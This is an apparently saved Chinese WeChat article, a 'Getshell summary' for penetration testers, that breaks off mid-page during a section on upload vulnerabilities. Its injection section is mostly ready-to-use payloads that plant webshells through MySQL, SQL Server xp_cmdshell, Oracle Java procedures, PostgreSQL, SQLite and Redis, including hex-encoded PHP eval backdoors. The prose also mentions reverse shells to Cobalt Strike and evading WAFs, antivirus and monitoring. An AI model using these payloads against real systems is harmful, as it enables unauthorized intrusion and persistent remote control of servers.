<html>
<head>
<title>渗透测试-Getshell总结</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
渗透测试-Getshell总结
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                                                                <span class="rich_media_meta rich_media_meta_text">
                                                                    sm0nk
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2020-04-11</em>
                </div>

                
                                                <div id="js_tags"  class="article-tag__list" style="display: none;" data-len="0">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                    </div>
                                    </div><div id="weixin_content"><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);" data-mpa-powered-by="yiban.io">&nbsp; 无论是常规渗透测试还是攻防对抗，亦或黑灰产对抗、APT攻击，getshell 是一个从内到外的里程碑成果。我们接下来总结下常见拿shell的一些思路和方法。文中可能有一些不足之处，还望大佬不吝赐教。</p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.4046875" data-s="300,640" src="图片/HACK学习呀_2020-04-11_渗透测试-Getshell总结/1_eOQYDZnXcMdMq31cz21smVuT87mnBw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibVgzGeKxdqIlJXCxKw8ws2Wsp2stQZ2YsnfMNLg7F0WjvteOQYDZnXcMdMq31cz21smVuT87mnBw/640?wx_fmt=png'" data-type="png" data-w="1280" style=""  /></p><h1 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.2;text-rendering: optimizelegibility;font-size:28px;line-height:48px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">0x01 注入getshell</h1><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">一般前提条件：有权限、知道路径</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;word-break: normal;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;"><span style="color: rgb(0, 0, 0);">mysql</span><br  /><span style="color: rgb(32, 74, 135);font-weight: bold;">select</span> <span style="color: rgb(0, 0, 207);font-weight: bold;">0</span><span style="color: rgb(0, 0, 0);">x3c3f70687020a6576616c28245f504f53545b615d293ba3f3e</span> <span style="color: rgb(32, 74, 135);font-weight: bold;">into</span> <span style="color: rgb(0, 0, 0);">outfile</span> <span style="color: rgb(78, 154, 6);">'/var/www/html/1.php'</span><br  /><br  /><span style="color: rgb(32, 74, 135);font-weight: bold;">Sql</span> <span style="color: rgb(0, 0, 0);">server</span><br  /><span style="color: rgb(164, 0, 0);border-width: 1px;border-style: solid;border-color: rgb(239, 41, 41);">存储过程</span><span style="color: rgb(0, 0, 0);">xp_cmdshell</span><br  /><span style="color: rgb(0, 0, 0);font-weight: bold;">;</span><span style="color: rgb(32, 74, 135);font-weight: bold;">exec</span> <span style="color: rgb(0, 0, 0);">master</span><span style="color: rgb(0, 0, 0);font-weight: bold;">..</span><span style="color: rgb(0, 0, 0);">xp_cmdshell</span> <span style="color: rgb(78, 154, 6);">'echo ^&lt;%@ Page Language="Jscript"%^&gt;^&lt;%eval(Request.Item["pass"],"unsafe");%^&gt; &gt; D:\\WWW\\2333.aspx'</span> <span style="color: rgb(0, 0, 0);font-weight: bold;">;</span><span style="color: rgb(143, 89, 2);font-style: italic;">--</span><br  /><br  /><span style="color: rgb(0, 0, 0);">Oracle</span><br  /><span style="color: rgb(0, 0, 207);font-weight: bold;">1</span><span style="color: rgb(164, 0, 0);border-width: 1px;border-style: solid;border-color: rgb(239, 41, 41);">、创建</span><span style="color: rgb(0, 0, 0);">JAVA包</span><br  /><span style="color: rgb(32, 74, 135);font-weight: bold;">select</span> <span style="color: rgb(0, 0, 0);">dbms_xmlquery</span><span style="color: rgb(0, 0, 0);font-weight: bold;">.</span><span style="color: rgb(0, 0, 0);">newcontext</span><span style="color: rgb(0, 0, 0);font-weight: bold;">(</span><span style="color: rgb(78, 154, 6);">'declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}}'';commit;end;'</span><span style="color: rgb(0, 0, 0);font-weight: bold;">)</span> <span style="color: rgb(32, 74, 135);font-weight: bold;">from</span> <span style="color: rgb(0, 0, 0);">dual</span><span style="color: rgb(0, 0, 0);font-weight: bold;">;</span><br  /><span style="color: rgb(0, 0, 207);font-weight: bold;">2</span><span style="color: rgb(164, 0, 0);border-width: 1px;border-style: solid;border-color: rgb(239, 41, 41);">、</span><span style="color: rgb(0, 0, 0);">JAVA权限</span><br  /><span style="color: rgb(32, 74, 135);font-weight: bold;">select</span> <span style="color: rgb(0, 0, 0);">dbms_xmlquery</span><span style="color: rgb(0, 0, 0);font-weight: bold;">.</span><span style="color: rgb(0, 0, 0);">newcontext</span><span style="color: rgb(0, 0, 0);font-weight: bold;">(</span><span style="color: rgb(78, 154, 6);">'declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''begin dbms_java.grant_permission( ''''SYSTEM'''', ''''SYS:java.io.FilePermission'''', ''''&lt;&lt;ALL FILES&gt;&gt;'''',''''EXECUTE'''');end;''commit;end;'</span><span style="color: rgb(0, 0, 0);font-weight: bold;">)</span> <span style="color: rgb(32, 74, 135);font-weight: bold;">from</span> <span style="color: rgb(0, 0, 0);">dual</span><span style="color: rgb(0, 0, 0);font-weight: bold;">;</span><br  /><span style="color: rgb(0, 0, 207);font-weight: bold;">3</span><span style="color: rgb(164, 0, 0);border-width: 1px;border-style: solid;border-color: rgb(239, 41, 41);">、创建函数</span><br  /><span style="color: rgb(32, 74, 135);font-weight: bold;">select</span> <span style="color: rgb(0, 0, 0);">dbms_xmlquery</span><span style="color: rgb(0, 0, 0);font-weight: bold;">.</span><span style="color: rgb(0, 0, 0);">newcontext</span><span style="color: rgb(0, 0, 0);font-weight: bold;">(</span><span style="color: rgb(78, 154, 6);">'declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name ''''LinxUtil.runCMD(java.lang.String) return String''''; '';commit;end;'</span><span style="color: rgb(0, 0, 0);font-weight: bold;">)</span> <span style="color: rgb(32, 74, 135);font-weight: bold;">from</span> <span style="color: rgb(0, 0, 0);">dual</span><span style="color: rgb(0, 0, 0);font-weight: bold;">;</span><br  /><span style="color: rgb(0, 0, 0);">URL执行</span><br  /><span style="color: rgb(0, 0, 0);">id</span><span style="color: rgb(206, 92, 0);font-weight: bold;">=</span><span style="color: rgb(0, 0, 207);font-weight: bold;">602</span><span style="color: rgb(78, 154, 6);">'||utl_inadd.get_host_name((select LinxRUNCMD('</span><span style="color: rgb(0, 0, 0);">cmd</span> <span style="color: rgb(206, 92, 0);font-weight: bold;">/</span><span style="color: rgb(32, 74, 135);font-weight: bold;">c</span> <span style="color: rgb(0, 0, 0);">dir</span> <span style="color: rgb(0, 0, 0);">d</span><span style="color: rgb(0, 0, 0);font-weight: bold;">:</span><span style="color: rgb(206, 92, 0);font-weight: bold;">/</span><span style="color: rgb(78, 154, 6);">') from dual))--</span><br  /><br  /><span style="color: rgb(78, 154, 6);">postgresql</span><br  /><span style="color: rgb(78, 154, 6);">COPY (select '</span><span style="color: rgb(206, 92, 0);font-weight: bold;">&lt;?</span><span style="color: rgb(0, 0, 0);">php</span> <span style="color: rgb(0, 0, 0);">phpinfo</span><span style="color: rgb(0, 0, 0);font-weight: bold;">();</span><span style="color: rgb(206, 92, 0);font-weight: bold;">?&gt;</span><span style="color: rgb(78, 154, 6);">') to '</span><span style="color: rgb(206, 92, 0);font-weight: bold;">/</span><span style="color: rgb(0, 0, 0);">tmp</span><span style="color: rgb(206, 92, 0);font-weight: bold;">/</span><span style="color: rgb(0, 0, 207);font-weight: bold;">1</span><span style="color: rgb(0, 0, 0);font-weight: bold;">.</span><span style="color: rgb(0, 0, 0);">php</span><span style="color: rgb(78, 154, 6);">';</span><br  /><br  /><span style="color: rgb(78, 154, 6);">sqlite3</span><br  /><span style="color: rgb(78, 154, 6);">;attach database '</span><span style="color: rgb(0, 0, 0);">D</span><span style="color: rgb(0, 0, 0);font-weight: bold;">:</span><span style="color: rgb(164, 0, 0);border-width: 1px;border-style: solid;border-color: rgb(239, 41, 41);">\\</span><span style="color: rgb(0, 0, 0);">www</span><span style="color: rgb(164, 0, 0);border-width: 1px;border-style: solid;border-color: rgb(239, 41, 41);">\\</span><span style="color: rgb(0, 0, 207);font-weight: bold;">008</span><span style="color: rgb(0, 0, 0);font-weight: bold;">.</span><span style="color: rgb(0, 0, 0);">php</span><span style="color: rgb(78, 154, 6);">' as tt;create TABLE tt.exp (dataz text) ; insert INTO tt.exp (dataz) VALUES (x'</span><span style="color: rgb(0, 0, 207);font-weight: bold;">3</span><span style="color: rgb(0, 0, 0);">c3f70687020406576616c28245f504f53545b27636d64275d293b3f3e</span><span style="color: rgb(164, 0, 0);border-width: 1px;border-style: solid;border-color: rgb(239, 41, 41);">'</span><span style="color: rgb(0, 0, 0);font-weight: bold;">);</span><br  /><br  /><span style="color: rgb(0, 0, 0);">redis</span><br  /><span style="color: rgb(206, 92, 0);font-weight: bold;">%</span><span style="color: rgb(0, 0, 207);font-weight: bold;">0</span><span style="color: rgb(0, 0, 0);">D</span><span style="color: rgb(206, 92, 0);font-weight: bold;">%</span><span style="color: rgb(0, 0, 207);font-weight: bold;">0</span><span style="color: rgb(0, 0, 0);">Aconfig</span><span style="color: rgb(206, 92, 0);font-weight: bold;">%</span><span style="color: rgb(0, 0, 207);font-weight: bold;">20</span><span style="color: rgb(32, 74, 135);font-weight: bold;">set</span><span style="color: rgb(206, 92, 0);font-weight: bold;">%</span><span style="color: rgb(0, 0, 207);font-weight: bold;">20</span><span style="color: rgb(0, 0, 0);">dir</span><span style="color: rgb(206, 92, 0);font-weight: bold;">%</span><span style="color: rgb(0, 0, 207);font-weight: bold;">20</span><span style="color: rgb(206, 92, 0);font-weight: bold;">%</span><span style="color: rgb(0, 0, 207);font-weight: bold;">2</span><span style="color: rgb(0, 0, 0);">Fvar</span><span style="color: rgb(206, 92, 0);font-weight: bold;">%</span><span style="color: rgb(0, 0, 207);font-weight: bold;">2</span><span style="color: rgb(0, 0, 0);">Fwww</span><span style="color: rgb(206, 92, 0);font-weight: bold;">%</span><span style="color: rgb(0, 0, 207);font-weight: bold;">2</span><span style="color: rgb(0, 0, 0);">Fhtml2F</span><span style="color: rgb(206, 92, 0);font-weight: bold;">%</span><span style="color: rgb(0, 0, 207);font-weight: bold;">0</span><span style="color: rgb(0, 0, 0);">D</span><span style="color: rgb(206, 92, 0);font-weight: bold;">%</span><span style="color: rgb(0, 0, 207);font-weight: bold;">0</span><span style="color: rgb(0, 0, 0);">Aconfig</span><span style="color: rgb(206, 92, 0);font-weight: bold;">%</span><span style="color: rgb(0, 0, 207);font-weight: bold;">20</span><span style="color: rgb(32, 74, 135);font-weight: bold;">set</span><span style="color: rgb(206, 92, 0);font-weight: bold;">%</span><span style="color: rgb(0, 0, 207);font-weight: bold;">20</span><span style="color: rgb(0, 0, 0);">dbfilename</span><span style="color: rgb(206, 92, 0);font-weight: bold;">%</span><span style="color: rgb(0, 0, 207);font-weight: bold;">20</span><span style="color: rgb(0, 0, 0);">shell</span><span style="color: rgb(206, 92, 0);font-weight: bold;">%</span><span style="color: rgb(0, 0, 207);font-weight: bold;">2</span><span style="color: rgb(0, 0, 0);">Ephp</span><span style="color: rgb(206, 92, 0);font-weight: bold;">%</span><span style="color: rgb(0, 0, 207);font-weight: bold;">0</span><span style="color: rgb(0, 0, 0);">D</span><span style="color: rgb(206, 92, 0);font-weight: bold;">%</span><span style="color: rgb(0, 0, 207);font-weight: bold;">0</span><span style="color: rgb(0, 0, 0);">Aset</span><span style="color: rgb(206, 92, 0);font-weight: bold;">%</span><span style="color: rgb(0, 0, 207);font-weight: bold;">20</span><span style="color: rgb(0, 0, 0);">x</span><span style="color: rgb(206, 92, 0);font-weight: bold;">%</span><span style="color: rgb(0, 0, 207);font-weight: bold;">2022</span><span style="color: rgb(206, 92, 0);font-weight: bold;">%</span><span style="color: rgb(0, 0, 207);font-weight: bold;">3</span><span style="color: rgb(32, 74, 135);font-weight: bold;">C</span><span style="color: rgb(206, 92, 0);font-weight: bold;">%</span><span style="color: rgb(0, 0, 207);font-weight: bold;">3</span><span style="color: rgb(0, 0, 0);">Fphp</span><span style="color: rgb(206, 92, 0);font-weight: bold;">%</span><span style="color: rgb(0, 0, 207);font-weight: bold;">20</span><span style="color: rgb(0, 0, 0);">phpinfo</span><span style="color: rgb(206, 92, 0);font-weight: bold;">%</span><span style="color: rgb(0, 0, 207);font-weight: bold;">28</span><span style="color: rgb(206, 92, 0);font-weight: bold;">%</span><span style="color: rgb(0, 0, 207);font-weight: bold;">29</span><span style="color: rgb(206, 92, 0);font-weight: bold;">%</span><span style="color: rgb(0, 0, 207);font-weight: bold;">3</span><span style="color: rgb(0, 0, 0);">B</span><span style="color: rgb(206, 92, 0);font-weight: bold;">%%</span><span style="color: rgb(0, 0, 207);font-weight: bold;">203</span><span style="color: rgb(0, 0, 0);">F</span><span style="color: rgb(206, 92, 0);font-weight: bold;">%</span><span style="color: rgb(0, 0, 207);font-weight: bold;">3</span><span style="color: rgb(0, 0, 0);">E</span><span style="color: rgb(206, 92, 0);font-weight: bold;">%</span><span style="color: rgb(0, 0, 207);font-weight: bold;">22</span><span style="color: rgb(206, 92, 0);font-weight: bold;">%</span><span style="color: rgb(0, 0, 207);font-weight: bold;">0</span><span style="color: rgb(0, 0, 0);">D</span><span style="color: rgb(206, 92, 0);font-weight: bold;">%</span><span style="color: rgb(0, 0, 207);font-weight: bold;">0</span><span style="color: rgb(0, 0, 0);">Asave</span><span style="color: rgb(206, 92, 0);font-weight: bold;">%</span><span style="color: rgb(0, 0, 207);font-weight: bold;">0</span><span style="color: rgb(0, 0, 0);">D</span><span style="color: rgb(206, 92, 0);font-weight: bold;">%</span><span style="color: rgb(0, 0, 207);font-weight: bold;">0</span><span style="color: rgb(0, 0, 0);">A</span><br  /></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">PS：oracle成功率受限于与数据库版本以及注入点</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">&nbsp;&nbsp;当然注入不一定都能拿到webshell，比如站库分离。但不管是否站库分离，只要权限够能够执行系统命令，反弹cmdshell 也是不错的选择。比如sa权限结合xp_cmdshell 存储过程，直接执行powershell,反弹到cobalt strike …</p><h1 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.2;text-rendering: optimizelegibility;font-size:28px;line-height:48px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">0x02 上传 getwebshell</h1><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">&nbsp;&nbsp; 上传漏洞对于getshell 还是高频的，无论是前台上传点，还是后台（通过口令进入、或者XSS到后台、逻辑漏洞越权）上传点，当然也有可能要结合一些Web Server的解析漏洞。但像IIS和apache解析漏洞因为太老，现在成功概率都小很多。<br  />&nbsp;&nbsp; 类似直接的上传漏洞就可以getshell的漏洞，例如IIS PUT上传、Tomcat PUT 上传，因为落脚点最终都跟上传有关系，这个就不单独去枚举。<br  />&nbsp;&nbsp; 还有一批像一些编辑器（FCK、editor、CKedtor…）存在上传漏洞可以getshell。这一系列，一般是基于信息收集确定是否存在漏洞，然后进一步利用。（发现漏洞比利用漏洞更艺术）</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">这个期间可能涉及逻辑绕过、WAF对抗、杀软绕过、执行层，主要解决四点：</p><ol style="padding-left: 2em;margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);" class="list-paddingleft-2"><li style="line-height: 26px;"><p>代码或逻辑问题，可以上传脚本文件</p></li><li style="line-height: 26px;"><p>躲过WAF对脚本文件及上传内容的校验</p></li><li style="line-height: 26px;"><p>解决落地杀</p></li><li style="line-height: 26px;"><p>执行过程，躲过流量监控或者系统层监控<br  />同样RCE 也需要关注以上后几点，因为前面的入口场景不同。</p></li></ol><h1 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, system-ui, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.2;text-rendering: 